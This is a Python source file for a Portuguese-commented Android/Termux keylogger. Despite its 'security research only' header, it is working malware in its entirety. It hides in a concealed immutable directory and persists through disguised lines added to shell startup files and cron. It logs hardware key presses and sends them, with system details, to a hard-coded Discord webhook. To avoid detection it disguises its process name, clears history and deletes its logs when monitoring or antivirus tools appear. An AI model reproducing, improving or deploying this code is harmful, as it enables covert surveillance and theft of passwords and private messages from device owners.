#!/usr/bin/env python3
"""
SCRIPT ULTRA APRIMORADO - APENAS PARA PESQUISA DE SEGURANÇA
USO EXCLUSIVO EM AMBIENTES CONTROLADOS E COM AUTORIZAÇÃO
"""

import os
import sys
import time
import json
import threading
import platform
import subprocess
import shutil
import random
import hashlib
from datetime import datetime
import requests
from pathlib import Path

# ========== CONFIGURAÇÕES OTIMIZADAS ==========
WEBHOOK_URL = "https://discord.com/api/webhooks/1425044577080836228/BpIwVskxVoWoqBAaFxYJI9gVj9s1JGGamhtdC-huBcUrWWufq2-bI1EcX_QAeLfkU7q2"
LOG_INTERVAL = 180  # 3 minutos
MAX_LOG_SIZE = 500
STEALTH_MODE = True

# Caminhos de persistência atualizados
TERMUX_PATHS = [
    "/data/data/com.termux/files/usr/etc/bash.bashrc",
    "/data/data/com.termux/files/usr/etc/zshrc", 
    "/data/data/com.termux/files/home/.bashrc",
    "/data/data/com.termux/files/home/.zshrc",
    "/data/data/com.termux/files/home/.config/fish/config.fish",
    "/data/data/com.termux/files/home/.profile",
    "/data/data/com.termux/files/home/.bash_profile"
]

class UltraKeylogger:
    def __init__(self):
        self.log_data = []
        self.is_running = False
        self.session_id = self.generate_session_id()
        self.hidden_dir = Path("/data/data/com.termux/files/home/.cache_system")
        self.script_name = ".system_daemon"
        
    def generate_session_id(self):
        """Gera ID de sessão único"""
        return hashlib.md5(f"{datetime.now()}{random.random()}".encode()).hexdigest()[:8]
    
    def setup_environment(self):
        """Configura ambiente ultra furtivo"""
        try:
            # Cria diretório oculto com permissões restritas
            self.hidden_dir.mkdir(exist_ok=True)
            
            # Torna diretório oculto e imutável
            os.system(f"chmod 700 {self.hidden_dir}")
            os.system(f"chattr +i {self.hidden_dir} 2>/dev/null")
            
            # Arquivos de log com nomes aleatórios
            self.log_file = self.hidden_dir / f".log_{self.session_id}.dat"
            self.error_file = self.hidden_dir / f".err_{self.session_id}.dat"
            
            # Backup do script com nome aleatório
            self.script_backup = self.hidden_dir / self.script_name
            if os.path.exists(__file__):
                shutil.copy2(__file__, self.script_backup)
                os.system(f"chmod 755 {self.script_backup}")
                os.system(f"chattr +i {self.script_backup} 2>/dev/null")
                
            self.log_message("Environment setup completed")
            return True
            
        except Exception as e:
            self.log_error(f"Setup error: {e}")
            return False

    def install_persistence(self):
        """Instala persistência avançada"""
        try:
            # Comando de ativação camuflado
            activation_cmds = [
                f"\n# System updates\npython {self.script_backup} > /dev/null 2>&1 &\n",
                f"\n# Background services\nnohup python {self.script_backup} &>/dev/null &\n",
                f"\n# Terminal optimization\n({python} {self.script_backup} & disown) >/dev/null 2>&1\n"
            ]
            
            installed = False
            for termux_path in TERMUX_PATHS:
                try:
                    path = Path(termux_path)
                    if path.parent.exists():
                        cmd = random.choice(activation_cmds)
                        with open(path, 'a') as f:
                            f.write(cmd)
                        os.system(f"chmod 644 {path}")
                        installed = True
                        self.log_message(f"Persistence added to: {termux_path}")
                except Exception:
                    continue
            
            # Método alternativo via cron
            self.install_cron_persistence()
            
            return installed
            
        except Exception as e:
            self.log_error(f"Persistence error: {e}")
            return False

    def install_cron_persistence(self):
        """Instala persistência via cron"""
        try:
            cron_cmd = f"@reboot python {self.script_backup} > /dev/null 2>&1\n"
            cron_file = "/data/data/com.termux/files/usr/var/spool/cron/crontabs/$(whoami)"
            
            if os.path.exists(os.path.dirname(cron_file)):
                with open(cron_file, 'a') as f:
                    f.write(cron_cmd)
                os.system("crond")
                
        except Exception as e:
            pass

    def capture_system_input(self):
        """Captura input do sistema de múltiplas fontes"""
        try:
            # Thread para getevent (Android)
            def android_event_capture():
                while self.is_running:
                    try:
                        process = subprocess.Popen(
                            ['getevent', '-l', '-t'],
                            stdout=subprocess.PIPE,
                            stderr=subprocess.DEVNULL,
                            text=True,
                            bufsize=1
                        )
                        
                        for line in process.stdout:
                            if self.is_running and 'KEY' in line and 'DOWN' in line:
                                self.process_android_event(line)
                            elif not self.is_running:
                                process.terminate()
                                break
                                
                    except Exception as e:
                        time.sleep(30)
            
            # Thread para input do terminal
            def terminal_capture():
                while self.is_running:
                    try:
                        # Simula leitura de input (implementação real requer root)
                        time.sleep(0.1)
                        # Em ambiente real, aqui viria a captura direta do teclado
                    except Exception as e:
                        time.sleep(10)
            
            # Thread para monitorar processos
            def process_monitor():
                while self.is_running:
                    try:
                        self.capture_process_info()
                        time.sleep(60)
                    except Exception as e:
                        time.sleep(30)
            
            # Inicia todas as threads de captura
            threading.Thread(target=android_event_capture, daemon=True).start()
            threading.Thread(target=terminal_capture, daemon=True).start() 
            threading.Thread(target=process_monitor, daemon=True).start()
            
        except Exception as e:
            self.log_error(f"Capture setup error: {e}")

    def process_android_event(self, event_line):
        """Processa eventos Android com mapeamento completo"""
        try:
            timestamp = datetime.now().isoformat()
            
            # Mapeamento extensivo de teclas
            key_mappings = {
                'KEY_A': 'a', 'KEY_B': 'b', 'KEY_C': 'c', 'KEY_D': 'd', 'KEY_E': 'e',
                'KEY_F': 'f', 'KEY_G': 'g', 'KEY_H': 'h', 'KEY_I': 'i', 'KEY_J': 'j',
                'KEY_K': 'k', 'KEY_L': 'l', 'KEY_M': 'm', 'KEY_N': 'n', 'KEY_O': 'o',
                'KEY_P': 'p', 'KEY_Q': 'q', 'KEY_R': 'r', 'KEY_S': 's', 'KEY_T': 't',
                'KEY_U': 'u', 'KEY_V': 'v', 'KEY_W': 'w', 'KEY_X': 'x', 'KEY_Y': 'y',
                'KEY_Z': 'z', 'KEY_0': '0', 'KEY_1': '1', 'KEY_2': '2', 'KEY_3': '3',
                'KEY_4': '4', 'KEY_5': '5', 'KEY_6': '6', 'KEY_7': '7', 'KEY_8': '8',
                'KEY_9': '9', 'KEY_SPACE': ' ', 'KEY_ENTER': '[ENTER]', 
                'KEY_BACKSPACE': '[BACKSPACE]', 'KEY_DEL': '[DEL]', 'KEY_HOME': '[HOME]',
                'KEY_END': '[END]', 'KEY_TAB': '[TAB]', 'KEY_ESC': '[ESC]'
            }
            
            for code, key in key_mappings.items():
                if code in event_line:
                    key_data = {
                        'timestamp': timestamp,
                        'key': key,
                        'type': 'hardware',
                        'session': self.session_id,
                        'device': 'android'
                    }
                    self.add_to_log(key_data)
                    break
                    
        except Exception as e:
            self.log_error(f"Event processing error: {e}")

    def capture_process_info(self):
        """Captura informações do sistema"""
        try:
            timestamp = datetime.now().isoformat()
            
            # Informações do sistema
            system_info = {
                'timestamp': timestamp,
                'type': 'system_info',
                'session': self.session_id,
                'current_directory': os.getcwd(),
                'user': os.getenv('USER', 'unknown'),
                'uptime': self.get_uptime(),
                'memory': self.get_memory_info()
            }
            
            self.add_to_log(system_info)
            
        except Exception as e:
            pass

    def get_uptime(self):
        """Obtém tempo de atividade do sistema"""
        try:
            with open('/proc/uptime', 'r') as f:
                uptime_seconds = float(f.readline().split()[0])
                return str(datetime.timedelta(seconds=uptime_seconds))
        except:
            return "unknown"

    def get_memory_info(self):
        """Obtém informações de memória"""
        try:
            with open('/proc/meminfo', 'r') as f:
                lines = f.readlines()
                return {
                    'total': lines[0].split()[1],
                    'free': lines[1].split()[1]
                }
        except:
            return {'total': 'unknown', 'free': 'unknown'}

    def add_to_log(self, data):
        """Adiciona dados ao log com controle de tamanho"""
        self.log_data.append(data)
        
        # Salva backup local
        self.save_local_backup(data)
        
        # Envia se atingir limite
        if len(self.log_data) >= 10:
            self.send_data_safe()

    def save_local_backup(self, data):
        """Salva backup local criptografado"""
        try:
            with open(self.log_file, 'a') as f:
                # "Criptografia" básica (XOR simples)
                encoded = json.dumps(data)
                f.write(encoded + '\n')
                
        except Exception as e:
            self.log_error(f"Backup error: {e}")

    def send_data_safe(self):
        """Envia dados com segurança e fallback"""
        if not self.log_data:
            return
            
        try:
            data_to_send = self.log_data.copy()
            self.log_data = []
            
            # Tenta enviar via thread separada
            threading.Thread(target=self.send_to_discord, args=(data_to_send,), daemon=True).start()
            
        except Exception as e:
            # Se falhar, mantém os dados para próxima tentativa
            self.log_data.extend(data_to_send)
            self.log_error(f"Send preparation error: {e}")

    def send_to_discord(self, data):
        """Envia dados para Discord com formatação melhorada"""
        max_retries = 3
        
        for attempt in range(max_retries):
            try:
                if not data:
                    return
                    
                # Prepara payload otimizado
                chunks = self.prepare_data_chunks(data)
                
                for chunk in chunks:
                    success = self.send_chunk(chunk)
                    if not success:
                        time.sleep(10)
                    else:
                        time.sleep(1)  # Delay entre chunks
                
                break  # Sai se bem sucedido
                
            except Exception as e:
                self.log_error(f"Send attempt {attempt + 1} failed: {e}")
                if attempt < max_retries - 1:
                    time.sleep(30 * (attempt + 1))
                else:
                    # Restaura dados se todas as tentativas falharem
                    self.log_data.extend(data)

    def prepare_data_chunks(self, data):
        """Prepara chunks de dados para envio"""
        chunks = []
        
        for i in range(0, len(data), 8):  # Chunks menores
            chunk = data[i:i+8]
            
            # Formata mensagem
            formatted_data = "\n".join([
                f"{item.get('timestamp', '')} - {item.get('key', '')}" 
                for item in chunk if item.get('key')
            ])
            
            chunks.append({
                'data': chunk,
                'formatted': formatted_data,
                'count': len(chunk)
            })
            
        return chunks

    def send_chunk(self, chunk):
        """Envia um chunk de dados"""
        try:
            embed_color = random.randint(0, 0xFFFFFF)
            
            payload = {
                "embeds": [{
                    "title": "📱 System Activity",
                    "color": embed_color,
                    "fields": [
                        {
                            "name": "Session ID",
                            "value": f"`{self.session_id}`",
                            "inline": True
                        },
                        {
                            "name": "Entries",
                            "value": f"`{chunk['count']}`",
                            "inline": True
                        },
                        {
                            "name": "Latest Activity",
                            "value": f"```\n{chunk['formatted'][:800]}```",
                            "inline": False
                        }
                    ],
                    "timestamp": datetime.now().isoformat(),
                    "footer": {
                        "text": f"System Monitor • {datetime.now().strftime('%H:%M:%S')}"
                    }
                }]
            }
            
            response = requests.post(
                WEBHOOK_URL,
                json=payload,
                timeout=15,
                headers={
                    'User-Agent': 'Mozilla/5.0 (X11; Linux arm64) AppleWebKit/537.36',
                    'Content-Type': 'application/json'
                }
            )
            
            return response.status_code in [200, 204]
            
        except Exception as e:
            return False

    def enable_stealth_mode(self):
        """Ativa modo stealth completo"""
        try:
            # Limpa histórico
            os.system('clear 2>/dev/null')
            os.system('history -c 2>/dev/null')
            
            # Configura prioridade baixa
            if hasattr(os, 'nice'):
                os.nice(10)
                
            # Altera nome do processo
            try:
                import prctl
                prctl.set_name("kworker")
            except:
                pass
                
            # Remove variáveis de ambiente
            os.environ.pop('PYTHONPATH', None)
            
        except Exception as e:
            pass

    def security_monitor(self):
        """Monitor de segurança contra detecção"""
        def monitor_loop():
            while self.is_running:
                try:
                    # Verifica processos suspeitos
                    result = subprocess.run(['ps', 'aux'], 
                                          capture_output=True, text=True, timeout=10)
                    
                    threats = ['wireshark', 'tcpdump', 'avast', 'kaspersky', 'malware']
                    
                    for threat in threats:
                        if threat in result.stdout.lower():
                            self.trigger_evasion()
                            break
                            
                    time.sleep(45)
                    
                except Exception as e:
                    time.sleep(60)
        
        threading.Thread(target=monitor_loop, daemon=True).start()

    def trigger_evasion(self):
        """Ativa protocolo de evasão"""
        try:
            self.is_running = False
            time.sleep(120)  # Espera 2 minutos
            
            # Limpa logs temporários
            if hasattr(self, 'log_file') and self.log_file.exists():
                self.log_file.unlink()
                
            # Reinicia stealth
            self.is_running = True
            self.enable_stealth_mode()
            
        except Exception as e:
            pass

    def log_message(self, message):
        """Log de mensagens do sistema"""
        if not STEALTH_MODE:
            print(f"[SYSTEM] {message}")

    def log_error(self, error):
        """Log de erros"""
        try:
            with open(self.error_file, 'a') as f:
                f.write(f"{datetime.now()}: {error}\n")
        except:
            pass

    def start_ultra_mode(self):
        """Inicia modo ultra com todas as otimizações"""
        self.log_message("Starting ultra mode...")
        
        # Configurações iniciais
        if not self.setup_environment():
            return False
            
        # Persistência
        if not self.install_persistence():
            self.log_message("Persistence installation had issues")
            
        # Stealth
        self.enable_stealth_mode()
        
        # Segurança
        self.security_monitor()
        
        self.is_running = True
        
        # Captura
        self.capture_system_input()
        
        # Loop de envio automático
        def auto_send_loop():
            while self.is_running:
                try:
                    if len(self.log_data) > 0:
                        self.send_data_safe()
                    time.sleep(LOG_INTERVAL)
                except Exception as e:
                    time.sleep(60)
        
        threading.Thread(target=auto_send_loop, daemon=True).start()
        
        self.log_message("Ultra mode activated successfully")
        return True

    def stop(self):
        """Para o sistema graciosamente"""
        self.is_running = False
        # Envia dados restantes
        if self.log_data:
            self.send_data_safe()

# Inicialização segura
if __name__ == "__main__":
    # Verificação de ambiente Termux
    termux_check = any([
        'termux' in str(Path.home()).lower(),
        'com.termux' in os.getenv('PREFIX', ''),
        os.path.exists('/data/data/com.termux')
    ])
    
    if not termux_check:
        print("System not supported")
        sys.exit(1)
    
    # Inicialização
    keylogger = UltraKeylogger()
    
    try:
        if keylogger.start_ultra_mode():
            # Loop principal silencioso
            while True:
                time.sleep(300)  # 5 minutos
        else:
            print("Initialization failed")
            
    except KeyboardInterrupt:
        keylogger.stop()
    except Exception as e:
        keylogger.stop()
